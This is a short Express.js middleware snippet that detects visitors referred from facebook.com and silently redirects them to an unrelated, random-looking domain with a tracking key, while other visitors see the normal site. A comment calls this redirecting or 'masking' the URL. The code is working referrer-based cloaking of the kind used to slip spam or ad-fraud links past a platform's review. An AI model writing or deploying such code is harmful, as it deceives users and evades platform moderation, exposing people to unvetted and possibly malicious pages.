app.use((req, res, next) => {
    const referrer = req.get('referer') || '';
    if (referrer.includes('facebook.com')) {
        // Redirect or mask the URL here
        res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
    } else {
        next();
    }
});
